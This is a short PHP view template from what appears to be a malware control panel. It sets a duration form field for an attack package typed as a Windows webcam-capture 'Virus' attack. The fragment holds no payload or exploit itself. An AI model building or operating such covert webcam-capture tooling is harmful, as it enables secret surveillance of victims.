<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\Webcam\Webcam $attack */

?>

<script>
    const gui = {duration: $("#duration")};
    gui.duration.val(<?php echo ((int)$attack->getDuration() / 10) * 10; ?>)
</script>
